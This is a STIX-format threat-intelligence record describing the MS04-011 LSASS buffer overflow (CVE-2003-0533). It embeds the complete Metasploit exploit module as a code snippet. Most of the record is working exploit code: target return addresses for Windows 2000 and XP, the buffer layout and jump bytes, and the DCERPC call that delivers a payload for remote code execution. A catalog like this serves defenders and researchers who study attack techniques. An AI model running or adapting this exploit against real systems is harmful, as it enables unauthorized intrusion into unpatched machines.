{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--97b7299b-2e61-4ab7-a09e-42064f7dde5b",
    "created": "2024-08-14T16:56:36.302317Z",
    "modified": "2024-08-14T16:56:36.302321Z",
    "name": "MS04-011 Microsoft LSASS Service DsRolerUpgradeDownlevelServer Overflow",
    "description": " This module exploits a stack buffer overflow in the LSASS service, this vulnerability was originally found by eEye. When re-exploiting a Windows XP system, you will need need to run this module twice. DCERPC request fragmentation can be performed by setting 'FragSize' parameter. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/ms04_011_lsass.rb",
            "external_id": "ms04_011_lsass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0533"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  #\n  # This module exploits a vulnerability in the LSASS service\n  #\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS04-011 Microsoft LSASS Service DsRolerUpgradeDownlevelServer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the LSASS service, this vulnerability\n        was originally found by eEye. When re-exploiting a Windows XP system, you will need\n        need to run this module twice. DCERPC request fragmentation can be performed by setting\n        'FragSize' parameter.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2003-0533' ],\n          [ 'OSVDB', '5248'     ],\n          [ 'BID', '10108' ],\n          [ 'MSB',   'MS04-011' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Automatic\n          [\n            'Automatic Targetting',\n            {\n              'Rets'     => [ ],\n            },\n          ],\n          # Windows 2000\n          [\n            'Windows 2000 English',\n            {\n              'Rets'     => [ 0x773242e0 ],\n            },\n          ],\n          # Windows XP\n          [\n            'Windows XP English',\n            {\n              'Rets'     => [ 0x7449bf1a ],\n            },\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2004-04-13'))\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  def exploit\n\n    connect(versions: [1])\n    smb_login()\n\n    handle = dcerpc_handle('3919286a-b10c-11d0-9ba8-00c04fd92ef5', '0.0', 'ncacn_np', ['\\lsarpc'])\n    print_status(\"Binding to #{handle}...\")\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle}...\")\n\n    print_status('Getting OS information...')\n\n    # Check the remote OS name and version\n    os = smb_peer_os\n    buff = ''\n    case os\n\n      # Windows 2000 requires that the string be unicode formatted\n      # and give us a nice set of registers which point back to\n      # the un-unicoded data. We simply return to a nop sled that\n      # jumps over the return address, some trash, and into the\n      # final payload. Easy as pie.\n      when /Windows 5\\.0/\n        str = rand_text_alphanumeric(3500)\n        str[2020, 4] = [targets[1]['Rets'][0]].pack('V')\n        str[2104, payload.encoded.length ] = payload.encoded\n        buff = NDR.UnicodeConformantVaryingString(str)\n\n      # Windows XP is a bit different, we need to use an ascii\n      # buffer and a jmp esp. The esp register points to an\n      # eight byte segment at the end of our buffer in memory,\n      # we make these bytes jump back to the beginning of the\n      # buffer, giving us about 1936 bytes of space for a\n      # payload.\n      when /Windows 5\\.1/\n        str = rand_text_alphanumeric(7000) + \"\\x00\\x00\"\n        str[0, payload.encoded.length ] = payload.encoded\n        str[1964, 4] = [targets[2]['Rets'][0]].pack('V')\n        str[1980, 5] = \"\\xe9\\x3f\\xf8\\xff\\xff\" # jmp back to payload\n        str[6998, 2] = \"\\x00\\x00\"\n        buff = NDR.UnicodeConformantVaryingStringPreBuilt(str)\n\n      # Unsupported target\n      else\n        print_status(\"No target is available for #{ os }\")\n        return\n    end\n\n    stub = buff +\n      NDR.long(rand(0xFFFFFF)) +\n      NDR.UnicodeConformantVaryingString('') +\n      NDR.UnicodeConformantVaryingString('') +\n      NDR.UnicodeConformantVaryingString('') +\n      NDR.UnicodeConformantVaryingString('') +\n      NDR.long(rand(0xFFFFFF)) +\n      NDR.UnicodeConformantVaryingString('') +\n      NDR.long(rand(0xFFFFFF)) +\n      NDR.UnicodeConformantVaryingString('') +\n      NDR.long(rand(0xFFFFFF)) +\n      NDR.UnicodeConformantVaryingString('') +\n      rand_text(528) +\n      rand_text(528) +\n      NDR.long(rand(0xFFFFFF))\n\n    print_status(\"Trying to exploit #{os}\")\n\n    begin\n      response = dcerpc_call(9, stub)\n    rescue Rex::Proto::DCERPC::Exceptions::NoResponse\n      print_status('Server did not respond, but that should be ok...')\n    rescue Rex::Proto::DCERPC::Exceptions::Fault\n      case $!.fault\n      when 0x1c010002\n        print_status('Server appears to have been patched')\n      else\n        print_status(\"Unexpected DCERPC fault 0x%.8x\" % $!.fault)\n      end\n    end\n\n    # Perform any required client-side payload handling\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-04-13",
    "x_mitre_platforms": [
        "win'"
    ]
}